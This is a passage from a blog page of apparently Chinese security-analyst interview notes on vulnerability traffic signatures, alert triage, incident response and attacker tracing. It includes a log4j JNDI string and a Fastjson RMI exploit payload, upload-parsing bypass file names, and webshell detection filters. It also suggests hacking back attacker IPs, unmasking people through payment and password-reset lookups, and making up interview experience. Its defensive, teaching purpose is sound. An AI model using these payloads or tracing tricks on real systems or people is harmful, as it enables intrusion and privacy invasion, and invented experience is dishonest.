href="#log4j2流量特征" class="headerlink" title="log4j2流量特征"></a>log4j2流量特征</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">很显然，利用jndi，多多少少有下面字样</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://tjxy78.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><h2 id="shiro漏洞"><a href="#shiro漏洞" class="headerlink" title="shiro漏洞"></a>shiro漏洞</h2><blockquote><p>apache的一个权限管理的开源框架,实现 用户认证、用户授权。</p></blockquote><blockquote><p>框架特征：cookie字段为存在rememberMe&#x3D;xxxxx;</p></blockquote><h3 id="550"><a href="#550" class="headerlink" title="550"></a>550</h3><p>若shiro框架服务端使用默认密钥，则会存在反序列化漏洞（爆破出默认密钥才可以）</p><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后用 户信息会经过加密编码后存储在cookie中。在 Cookie 读取过程中有用 AES 对Cookie 值解密的过程，对于 AES 这类对称加密算法，一旦秘钥泄露加密便形同虚设。若秘钥可控，同时Cookie 值是由攻击者构造的恶意 Payload，就可以将流程走通，触发危险的 Java 反序列化，从而导致远程命令执行漏洞。</p><blockquote><p><a href="https://blog.csdn.net/qq_28205153/article/details/55798628">AES加密算法的详细介绍与实现</a></p></blockquote><h3 id="721"><a href="#721" class="headerlink" title="721"></a>721</h3><p>原理：由于Apache Shiro中通过 AES-128-CBC 模式加密的rememberMe字段存 在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行</p><p><strong>用通俗易懂的话来说就是</strong></p><p>shiro721用到的加密方式是AES-CBC，而且其中的ase加密的key基本猜不到了，是系统随机生成的。而cookie解析过程跟cookie的解析过程一样，也就意味着如果能伪造恶意的rememberMe字段的值且目标含有可利用的攻击链的话，还是能够进行RCE的x&#96;</p><p>复现步骤：</p><ol><li>输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。</li><li>使用RememberMe cookie作为Padding Oracle Attack的前缀。</li><li>加密ysoserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。</li><li>请求带有新的RememberMe cookie的网站，以执行反序列化攻击。</li><li>攻击者无需知道RememberMe加密的密码密钥。</li></ol><p>Apache Shiro RememberMe Cookie默认通过AES-128-CBC模式加密，这种加密方式容易受到Padding Oracle Attack（Oracle填充攻击），利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击。</p><h3 id="shiro流量特征"><a href="#shiro流量特征" class="headerlink" title="shiro流量特征"></a>shiro流量特征</h3><ol><li>你要怎么通过流量分析知道对方使用的 shiro 攻击是否成功呢？</li></ol><p>比如说我们可以看看出网流量，有没有发送 shell 的情况，因为shiro 利用一般都会弹 shell。其次，我们可以通过 ids 等设备，如果发现数据包 header 的数据特别长，cookie 特别长的情况可能就是有人在用 shiro 反序列化了，因为这个漏洞的利用是在 cookie 传入指令</p><h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h2><blockquote><p><a href="https://11pmsleep.github.io/2022-09-24-WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">0x12 - redis 未授权访问漏洞</a></p></blockquote><hr><h2 id="—框架漏洞—"><a href="#—框架漏洞—" class="headerlink" title="—框架漏洞—"></a><strong>—框架漏洞—</strong></h2><h2 id="struct2框架漏洞"><a href="#struct2框架漏洞" class="headerlink" title="struct2框架漏洞"></a>struct2框架漏洞</h2><p>一个基于MVC设计模式的Web应用框架)。这个框架全是漏洞</p><p>Struts2是apache项目下的一个web框架，使用OGNL作为默认的表达式语言，由于OGNL能够创建或更改可执行代码，因此能够为使用它的任何框架引入严重的安全漏洞，多个Apache Struts 2版本容易受到OGNL安全漏洞的攻击。</p><h3 id="S2-001远程执行代码漏洞"><a href="#S2-001远程执行代码漏洞" class="headerlink" title="S2-001远程执行代码漏洞"></a>S2-001远程执行代码漏洞</h3><p>漏洞原理：该漏洞因用户提交表单数据并且验证失败时，后端将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL表达式解析，所以可以直接构造Payload进行命令执行</p><h2 id="fastjson框架漏洞"><a href="#fastjson框架漏洞" class="headerlink" title="fastjson框架漏洞"></a>fastjson框架漏洞</h2><p>fastjson 反序列化漏洞，fastjson 在解析 json 的过程中，支持使用autoType 来实例化某一个具体的类，并调用该类的 set&#x2F;get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。进而造成 rce</p><p>通俗理解就是：<strong>漏洞利用fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码，再反弹shell给我们监听的端口。</strong></p><p>fastjson的原理就是再反序列化的时候，可以利用搭建一个恶意的rmi服务器上放一个恶意的类，然后通过json的JNDI References的rmi远程下载这个类，fastjson就会反序列化，然后执行rce。</p><p>Fastjson 1.2.47 远程命令执行漏洞：fastjson于1.2.47版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。影响版本fastjson &lt;1.2.48。</p><p>框架特征：post数据包，content-type为application&#x2F;json,      post内容为json数据，且其中有@type标识，如下面可以看到@type</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="thinkphp框架漏洞"><a href="#thinkphp框架漏洞" class="headerlink" title="thinkphp框架漏洞"></a>thinkphp框架漏洞</h2><hr><h2 id="—中间件漏洞—"><a href="#—中间件漏洞—" class="headerlink" title="—中间件漏洞—"></a><strong>—中间件漏洞—</strong></h2><h2 id="weblogic容器漏洞"><a href="#weblogic容器漏洞" class="headerlink" title="weblogic容器漏洞"></a>weblogic容器漏洞</h2><p>一个基于JAVAEE架构的中间件</p><p>weblogic存在许多漏洞，弱口令，SSRF，反序列化，任意文件上传，XMLDecoder反序列化</p><blockquote><p><strong>框架特征</strong>：一般在7001端口，漏洞检测常用工具</p></blockquote><h2 id="tomcat容器漏洞"><a href="#tomcat容器漏洞" class="headerlink" title="tomcat容器漏洞"></a>tomcat容器漏洞</h2><p>漏洞，弱口令，幽灵猫，PUT方法任意写文件</p><h2 id="常见的中间件解析漏洞利⽤⽅式"><a href="#常见的中间件解析漏洞利⽤⽅式" class="headerlink" title="常见的中间件解析漏洞利⽤⽅式"></a>常见的中间件解析漏洞利⽤⽅式</h2><h3 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h3><p>&#x2F;xx.asp&#x2F;xx.jpg “xx.asp” 是⽂件夹名 </p><h3 id="IIS-7-0-x2F-7-5"><a href="#IIS-7-0-x2F-7-5" class="headerlink" title="IIS 7.0&#x2F;7.5"></a>IIS 7.0&#x2F;7.5</h3><p>默认 Fast-CGI 开启，直接在 url 中图⽚地址后⾯输⼊ &#x2F; 1.php，会把正常图⽚当成 php 解析 </p><p>此时我们上传一个shell.png，然后访问shell.png&#x2F;shell.php，当nginx发现文件扩展名为php，便将uri交给php处理，在php默认的配置下，发现shell.php并不存在，则向上一级目录修正，读取shell.png，shell.png是图片马，最终利用成功</p><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>版本⼩于等于 0.8.37，利⽤⽅法和 IIS 7.0&#x2F;7.5 ⼀样，Fast-CGI 关闭情况下也可利⽤。 </p><p>空字节代码 xxx.jpg%00.php </p><p>Nginx 0.8.41<del>1.4.3 Nginx 1.5.0</del>1.5.7中1.gif[0x20][0x00].php绕过</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>上传的⽂件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀</p><p>这是在低版本中，在稍微高一点的版本中，只要文件中带有php后周，就会被当作php解析，不必在最后面</p><p>httpd 2.4.0~2.4.29版本中还存在换行解析漏洞</p><hr><h1 id="owasp-top-10"><a href="#owasp-top-10" class="headerlink" title="owasp top 10"></a>owasp top 10</h1><h1 id="监控组"><a href="#监控组" class="headerlink" title="监控组"></a>监控组</h1><h3 id="和甲方上报-IP-地址，你要上报哪些地址呢？"><a href="#和甲方上报-IP-地址，你要上报哪些地址呢？" class="headerlink" title="和甲方上报 IP 地址，你要上报哪些地址呢？"></a>和甲方上报 IP 地址，你要上报哪些地址呢？</h3><p>上报攻击 ip 的地址，先判断是内网 ip 还是公网 ip，如果是内网ip，查看是否是业务白名单行为，若不是再上报进行判断。若是公网 ip，查看是否在白名单内，若不是查看是否是扫描器 ip，若是扫描器 ip，扫描对业务或者对研判产生了影响则可以上报，若不是且判断出是真实攻击 ip 也进行上报。</p><h3 id="如果看到一个告警ip，如何判断是否是真实攻击？"><a href="#如果看到一个告警ip，如何判断是否是真实攻击？" class="headerlink" title="如果看到一个告警ip，如何判断是否是真实攻击？"></a>如果看到一个告警ip，如何判断是否是真实攻击？</h3><blockquote><ul><li>排查告警IP的逻辑</li></ul><p>首先，我会先判断一下ip来源，判断是内网ip还是公网ip</p><p>若为<strong>内网ip</strong></p><blockquote><ul><li>然后对请求包的内容是否存在<strong>恶意payload</strong>，然后再根据响应包内容有执行成功的回显，若相应包中有对应的payload的回显，则可以判断为攻击成功，</li><li>但是此时，需要判断下是否为<strong>业务系统的逻辑</strong>造成的和是否是工作人员在<strong>测试业务系统漏洞</strong>，若工作人员证实了该告警为自家安全ip，则认为该攻击为误报，若非自家ip且不存在逻辑因素，则可判断为内网攻陷。</li></ul></blockquote><p>若为<strong>公网ip</strong></p><blockquote><ul><li>通过流量特征判断，如特征里面含有漏洞利用的 <strong>payload</strong>，或者恶意payload利用成功，则可判断为真实攻击。</li><li>对于公网IP也可以通过<strong>威胁情报网站</strong>，对攻击 ip 进行搜索，如果攻击 ip 被标记为恶意 ip，大概率为恶意攻击</li></ul></blockquote><ul><li>可以对请求包进行<strong>重放来判断</strong>，在自己的机器上重放流量包，将 payload 改成自己的 payload 来判断是否攻击成功</li><li>此外，从大体上可以通过<strong>返回包判断攻击是否成功</strong>，比如命令执行攻击有回显的话返回包就会有命令执行的结果。</li><li>如果有一些<strong>安全设备</strong>的话也可以通过查看告警信息判断。</li></ul></blockquote><h3 id="如何判断是扫描器还是红队的攻击"><a href="#如何判断是扫描器还是红队的攻击" class="headerlink" title="如何判断是扫描器还是红队的攻击"></a>如何判断是扫描器还是红队的攻击</h3><blockquote><ul><li>扫描器一般都是短时间，大量重复的攻击，且攻击 payload 都极为相似，可以通过搜索历史 ip 日志判断，而且扫描器的 payload 一般比较杂乱。大部分请求包对应的返回包都是一样的。</li><li>红队攻击一般流量比较少，且 payload 比较简练，不同请求对应的返回包会有变化。</li></ul></blockquote><h3 id="海量的上报怎么判断"><a href="#海量的上报怎么判断" class="headerlink" title="海量的上报怎么判断"></a>海量的上报怎么判断</h3><blockquote><ul><li>有<strong>分析平台的话可以批量分析流量数据</strong>，或者批量导出然后用 excle做一下透视。</li><li>借助分析设备批量分析，查看是否有<strong>同 IP</strong> 有多个攻击行为的。</li><li>首先把<strong>无效的 c 段直接过滤</strong>之后，再去研判</li><li>对于常见的误报，很容易进行识别，主要是<strong>针对于不常见的误报要进行研判</strong>，提取出流量包进行审计，对于某些特殊的 payload 进行复现</li></ul></blockquote><h3 id="如何确定是否是误报？"><a href="#如何确定是否是误报？" class="headerlink" title="如何确定是否是误报？"></a>如何确定是否是误报？</h3><blockquote><ul><li>利用安全设备，分析近期设备告警将全部流量日志（日志条件：源地址，目的地址，端口，事件名称，时间，规则 ID，发生 次数等）根据研判标准进行筛选，一般情况下，真实攻击不可能只持续一次，它一定是长时间、周期性、多 IP 的进行攻击。<strong>所以我们可以将时间线拉长，看看类似的请求或者数据包在之前很长一段时间有无重复出现。</strong></li><li>如果<strong>不是特别有规律的参数</strong>，如md5这类，一般是业务误报。</li><li>观察<strong>包的内容</strong>，对请求数据包和返回数据包分析判断其是否为误报。如果是一些类似于文件操作或者命令执行的参数，很有可能就是攻击数据包。</li><li>结合<strong>流量日志IP</strong>，配合微步、奇安信威胁情报中心、<strong>绿盟威胁情报云等威胁情报库，对IP进行分析，是不是恶意攻击</strong></li><li>对包内容分析后实在<strong>不确定就去问客户</strong>。是不是正常的业务请求,或者是业务漏洞</li><li>如果是内网恶意攻击的话，不一定是内网沦陷，进行下一步操作，在<strong>资产梳理表格</strong>中查找 IP 是否为客户内网部署的设备，</li></ul></blockquote><h3 id="CS外连，怎么办？"><a href="#CS外连，怎么办？" class="headerlink" title="CS外连，怎么办？"></a>CS外连，怎么办？</h3><p>观察响应包是只出现一次还是持续性，若有危险直接封禁</p><h1 id="研判组"><a href="#研判组" class="headerlink" title="研判组"></a>研判组</h1><p>研判工作要充分<strong>利用已有安全设备</strong>（需要提前了解客户的网络拓扑以及部署设备情况），分析其近期的设备告警，<strong>将全部流量日志</strong>（日志条件：源地址，目的地址，端口，事件名称，时间，规则 ID，发生 次数等）<strong>根据研判标准进行筛选</strong>（像挖矿、蠕虫、病毒、拒绝服务这类不太可能为攻击方发起的攻击的事件，直接过滤掉，减少告警数量），一般情况下，真实攻击不可能只持续一次，它一定是<strong>长时间、周期性、多 IP 的进行攻击</strong></p><p>对于告警结合<strong>威胁情报库</strong>如：微步、奇安信威胁情报中心、<strong>绿盟威胁情报云</strong>等对于流量日志的原 IP 地址进行分析，判断其是否为恶意攻击，推荐使用微步的插件，如果确认为攻击行为或者不能确认是否为攻击行为，进行下一步操作，在之前准备好的表格中查找 IP 是否为<strong>客户内网部署的设备</strong>，如果不是，继续进行下一步，在事件上报平台查看<strong>是否有其他人提交过</strong>，如果没有，则上报</p><p>然后根据流量日志，对请求<strong>数据包和返回数据包分析</strong>判断其是否为误报，需要留意 <strong>X-Forwarded-For（简称XFF）和 x-real-ip</strong> 可以了解些 webshell 工具的<strong>流量特征</strong>，尤其是免杀 webshell，有可能不会被设备识别</p><p>最后上报事件时，尽可能提供完整的截图，包括源 ip、目的ip，请求包请求体，响应包响应体等重要信息，以方便后续人员研判溯源</p><p><strong>注：不要任意忽略内网告警，适当情况下可以往前推排查时间</strong></p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><blockquote><p>准备，检测，遏制，根除，恢复，跟踪</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">准备已经编译好的⼯具以及取证分析等⼯具⼲净可靠放 U 盘</span><br><span class="line">初步判断事件的类型 是被⼊侵 ddos 还是其它的原因，以及事件等级。</span><br><span class="line">⾸先抑制范围、影响范围，隔离使受害⾯不继续扩⼤。</span><br><span class="line">寻找原因，封堵攻击源。</span><br><span class="line">把业务恢复⾄正常⽔平</span><br><span class="line">监控有⽆异常，报告、管理环节的⾃省和改进措施。</span><br></pre></td></tr></table></figure><h3 id="你有过应急响应的经验吗？"><a href="#你有过应急响应的经验吗？" class="headerlink" title="你有过应急响应的经验吗？"></a>你有过应急响应的经验吗？</h3><blockquote><p>可以尝试编。</p><p>在学校服务器机房学习时，机器疑似被入侵者入侵，登录机器通过查看进程（ps -ef 和top 命令），发现陌生进程。机房运维人员通过查看日志找到攻击者的信息。协助进行入侵排查，是否存在ssh 密钥，计划任务，启动项等可能留后门的行为，查找并删除木马以及在运维人员同意下更改用户密码及时报备。</p></blockquote><h3 id="linux入侵排查（详细的见思维导图）此处只是一个简略的书写"><a href="#linux入侵排查（详细的见思维导图）此处只是一个简略的书写" class="headerlink" title="linux入侵排查（详细的见思维导图）此处只是一个简略的书写~"></a>linux入侵排查（详细的见思维导图）此处只是一个简略的书写~</h3><blockquote><p>文档链接: <a href="https://www.mubucm.com/doc/8aGBgK_MVg">https://www.mubucm.com/doc/8aGBgK_MVg</a> </p></blockquote><blockquote><ul><li>先查看&#x2F;etc&#x2F;passwd是否有新建用户</li><li>查看&#x2F;var&#x2F;log&#x2F;wtmp下的登录日志查看是否有登录痕迹</li><li>若有，查看用户家目录下的bash_history，是否有遗留的命令。</li><li>ps -ef查看是否有木马进程，netstat命令查看是否有正在通信的陌生ip，以及是否新开了对外端口</li><li>查看服务日志，判断入侵者是怎么入侵进来的。</li><li>查看文件修改时间，判断是否有文件被修改。</li><li>查看计划任务以及ssh公钥文件，是否有遗留后门。</li><li>将系统所有可登录用户密码进行更改</li></ul></blockquote><h3 id="服务器存在webshell，如何处理？"><a href="#服务器存在webshell，如何处理？" class="headerlink" title="服务器存在webshell，如何处理？"></a>服务器存在webshell，如何处理？</h3><p>网站被植入 webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入 webshell 接管网站的控制权</p><blockquote><ol><li>及时隔离主机</li><li>定位事件范围，查看文件 webshell 文件的创建时间，对 webshell 取证样本</li><li>通过创建时间结合日志分析可疑行为，以及启动用户的其他进程确定漏洞</li><li>清除 webshell 及残留文件，修复漏洞，进行<strong>入侵排查</strong></li></ol></blockquote><h3 id="cs-进入内网后如何应急"><a href="#cs-进入内网后如何应急" class="headerlink" title="cs 进入内网后如何应急"></a>cs 进入内网后如何应急</h3><blockquote><p>首先自然是看看在线用户，有未授权用户就踢掉</p></blockquote><h3 id="怎么检测、查杀webshell，怎么检测webshell"><a href="#怎么检测、查杀webshell，怎么检测webshell" class="headerlink" title="怎么检测、查杀webshell，怎么检测webshell"></a>怎么检测、查杀webshell，怎么检测webshell</h3><p><strong>主机层面</strong></p><blockquote><ol><li>静态：静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell。</li></ol><ul><li>通过一些查杀工具对比特征值，如D盾、安全狗进行全盘扫描</li><li>对比历史文件夹，查看是否有新增可疑文件,近期修改的文件</li></ul><ol start="2"><li>动态</li></ol><p>通过日志，流量，文件访问频率、访问记录等方法查看文件找到webshell进行检测</p><p>webshell 传到服务器了，在执行函数时这些对于系统调用、系统配置、数据库、文件的操作动作都是可以作为判断依据</p><ol start="3"><li>日志检测</li></ol><p>使用 webshell 一般不会在系统日志中留下记录，但是会在网站的 web 日志中留下 webshell 页面的访问数据和数据提交记录</p><ol start="4"><li>语法检测</li></ol><p>语法语义分析形式，是根据 php 语言扫描编译的实现方式，进行剥离代码、注释，分析变量、函数、字符串、语言结构的分析方式，来实现关键危险函数的捕捉方式这样可以完美解决漏报的情况但误报上</p></blockquote><p><strong>流量层面</strong></p><blockquote><p>webshell流量特征</p></blockquote><h3 id="一台主机在内网进行横向攻击，你应该怎么做"><a href="#一台主机在内网进行横向攻击，你应该怎么做" class="headerlink" title="一台主机在内网进行横向攻击，你应该怎么做"></a>一台主机在内网进行横向攻击，你应该怎么做</h3><blockquote><p>确定攻击来源，是不是员工内部误操作，比如询问运维是否有自动化轮训脚本，判断是否为真实攻击</p><p>如果没有，确定是攻击，结合时间点，根据设备信息，看一下安全事件，进程，流量，端口，启动项，定时任务等等</p><p>找到问题主机，开始应急响应流程：准备，检测，遏制，根除，恢复，跟踪，具体的操作要交给现场运维去处理。</p></blockquote><h3 id="红队删除了历史记录怎么搞"><a href="#红队删除了历史记录怎么搞" class="headerlink" title="红队删除了历史记录怎么搞"></a>红队删除了历史记录怎么搞</h3><blockquote><ul><li>有 history 恢复工具。刚删除的话，内存打快照可以分析。硬盘还没覆盖可以恢复。</li><li>使用安全设别，分析平台，溯源设备等。一般溯源设备都能展示完整的攻击链了。入网流量也可以看到攻击者的动作，包括一些中间件的日志等，比如 iis，nginx 这些都是有日志的。</li></ul></blockquote><h1 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h1><blockquote><ul><li><a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/260888">域前置溯源方法思考</a></li></ul></blockquote><h2 id="你会用什么办法溯源攻击方的个人信息呢"><a href="#你会用什么办法溯源攻击方的个人信息呢" class="headerlink" title="你会用什么办法溯源攻击方的个人信息呢"></a>你会用什么办法溯源攻击方的个人信息呢</h2><blockquote><p>1.首先通过日志和蜜罐等方式获取到攻击方的 ip，可以对 ip 进行反向渗透获取信息，定位攻击者信息。</p><p>2.也可以通过搜索引擎或者安全情报，获取 ip 对应攻击者的网名id，再通过社交平台获取攻击者的信息</p><p>3.通过攻击 IP 历史解析记录&#x2F;域名，对域名注册信息进行溯源分析</p><p>4.如果攻击者有种植木马等，可以提取样本特征如用户名、ID、邮箱、C2 服务器等信息—同源分析</p><p>5.搭载 jsonp 钓鱼的蜜罐，通过 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等</p></blockquote><h2 id="溯源基本步骤"><a href="#溯源基本步骤" class="headerlink" title="溯源基本步骤"></a>溯源基本步骤</h2><ol><li>攻击源捕获</li></ol><blockquote><ul><li>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等</li><li>日志与流量分析，异常的通讯流量、攻击源与攻击目标等</li><li>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等</li><li>邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等</li><li>蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息</li></ul></blockquote><ol start="2"><li>溯源反制手段</li></ol><blockquote><ul><li><strong>IP 定位技术</strong> 根据IP定位物理地址–代理 IP 溯源案例：通过 IP 端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息</li><li><strong>ID 追踪术 ID 追踪术</strong>，搜索引擎、社交平台、技术论坛、社工库匹配 溯源案例：利用 ID 从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</li><li><strong>网站 url 域名</strong> Whois 查询–注册人姓名、地址、电话和邮箱 –域名隐私保护 溯源案例：通过攻击 IP 历史解析记录&#x2F;域名，对域名注册信息进行溯源分析</li><li><strong>恶意样本分析</strong> 提取样本特征、用户名、ID、邮箱、C2 服务器等信息–同源分析 溯源案例：样本分析过程中，发现攻击者的个人 ID 和 QQ，成功定位到攻击者</li><li><strong>社交账号</strong> 基于 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等 利用条件：可以找到相关社交网站的 jsonp 接口泄露敏感信息，相关网站登录未注销</li></ul></blockquote><ol start="3"><li>攻击者画像</li></ol><blockquote><ul><li>攻击路径</li></ul><p>攻击目的：拿到权限、窃取数据、获取利益、DDOS 等 网络代理：代理 IP、跳板机、C2 服务器等 攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等</p><ul><li>攻击者身份画像</li></ul><p>虚拟身份：ID、昵称、网名 真实身份：姓名、物理位置 联系方式：手机号、qq&#x2F;微信、邮箱 组织情况：单位名称、职位信息</p></blockquote><h2 id="溯源技巧"><a href="#溯源技巧" class="headerlink" title="溯源技巧"></a>溯源技巧</h2><blockquote><ol><li>域名、ip 反查目标个人信息</li><li>支付宝转账，确定目标姓氏</li><li>淘宝找回密码，确定目标名字</li><li>企业微信手机号查公司名称</li><li>REG007 查注册应用、网站</li><li>程序 PDB 信息泄露</li></ol></blockquote><h2 id="主动防御"><a href="#主动防御" class="headerlink" title="主动防御"></a>主动防御</h2><blockquote><p><a href="https://www.freebuf.com/articles/web/245585.html">基于网络欺骗与浏览器指纹的WEB攻击溯源</a></p></blockquote><ol><li><p>浏览器指纹技术</p><blockquote><p>在浏览器与网站服务器交互时，浏览器会向网站暴露许多的不同消息，比如浏览器型号、浏览器版本、操作系统等信息。如同人的指纹可以用来识别不同的人一样，当浏览器暴露信息的熵足够高时，网站就可利用这些信息来识别、追踪和定位用户。</p></blockquote></li><li><p>网络欺骗技术，蜜罐蜜网</p><blockquote><p>网络欺骗是一种针对网络攻击的防御手段（或策略），目的是让攻击者相信目标系统存在有价值的、可利用的安全弱点（伪造或不重要的），从而将攻击者引向这些错误的资源，以达到检测攻击、阻碍攻击、记录攻击行为的目的。其中，蜜罐是我们常见的一种网络欺骗技术，除了蜜罐技术，还存在蜜饵、蜜网、虚拟网络拓扑等多种欺骗技术实现方式。</p></blockquote></li></ol><h2 id="如何通过流量溯源，定位IP"><a href="#如何通过流量溯源，定位IP" class="headerlink" title="如何通过流量溯源，定位IP"></a>如何通过流量溯源，定位IP</h2><p>可利用流量工具 wireshark 进行溯源：</p><blockquote><ol><li>查看 eval、 z0、 shell whoami 等关键字，查看出现次数过多的时候， 需要查看是哪个页面发起的请求，有可能是 webshell</li><li>通过 WireShark 工具快速搜索关键字，定位到异常流量包</li><li>找出异常 IP 和所上传的内容，查看是否为 webshell</li></ol></blockquote><p>如何定位到攻击IP：</p><blockquote><ol><li>首先通过选择 - 统计 - 对话查看流量的走向情况， 定位可疑的 IP 地址</li><li>根据定位到的 IP 地址，尝试对上传的 webshell 进行定位</li></ol></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash ip.addr == ip &amp;&amp; http matches &quot;uploadllevallselectlxp_cmdshell&quot; &amp;&amp; http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure><p>查找到 webshell 后尝试溯源漏洞位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash http.request.uri contains &quot;webshell.php&quot;</span><br></pre></td></tr></table></figure><p>定位到最开始 webshell 执行或上传的时候</p><p>根据最开始的 HTTP 上传包或者其他漏洞特征定位漏洞类型</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><blockquote><p>wireshark 简单的过滤规则</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">过滤ip：</span></span><br><span class="line">过滤源 ip 地址：ip.src1.1.1.1</span><br><span class="line">目的 ip 地址：ip.dst1.1.1.1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">过滤端口：</span></span><br><span class="line">过滤80端口：tcp.port == 80</span><br><span class="line">源端口：tcp.srcport == 80</span><br><span class="line">目的端：tcp.dstport == 80</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">协议过滤：直接输入协议名即可，如 http 协议 http</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">http 模式过滤：过滤 get/post 包 httprequest.mothod == <span class="string">&quot;GET/POST&quot;</span></span></span><br></pre></td></tr></table></figure><h2 id="常用取证工具"><a href="#常用取证工具" class="headerlink" title="常用取证工具"></a>常用取证工具</h2><p>Wireshark、xplico、 Volatility、 FastlR Collector、Autopsy、 Dumplt、 FTK Imager、Foremost、Scalpel、 Bulk_ exetractor 等</p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="windows日志和Linux日志在哪-x2F-日志位置："><a href="#windows日志和Linux日志在哪-x2F-日志位置：" class="headerlink" title="windows日志和Linux日志在哪&#x2F;日志位置："></a>windows日志和Linux日志在哪&#x2F;日志位置：</h3><p>linux:一般来说linux的系统日志都放在&#x2F;var&#x2F;log目录下面 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一</span><br><span class="line">/var/log/secure 与安全相关的日志信息</span><br><span class="line">/var/log/maillog 与邮件相关的日志信息</span><br><span class="line">/var/log/cron 与定时任务相关的日志信息</span><br><span class="line">/var/log/spooler 与UUCP和news设备相关的日志信息</span><br><span class="line">/var/log/boot.log 守护进程启动和停止相关的日志消息</span><br><span class="line">/var/log/wtmp （linux登录日志）该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件</span><br><span class="line">/var/log/syslog：它和/etc/log/messages日志文件不同，它只记录警告信息，常常是系统出问题的信息。</span><br><span class="line">/var/log/user.log：记录所有等级用户信息的日志。</span><br><span class="line">/var/log/auth.log：包含系统授权信息，包括用户登录和使用的权限机制等。</span><br><span class="line">/var/log/daemon.log：包含各种系统后台守护进程日志信息。</span><br><span class="line">/var/log/kern.log：包含内核产生的日志，有助于在定制内核时解决问题。</span><br></pre></td></tr></table></figure><h3 id="Apache、Nginx与IIS日志位置及内容分析"><a href="#Apache、Nginx与IIS日志位置及内容分析" class="headerlink" 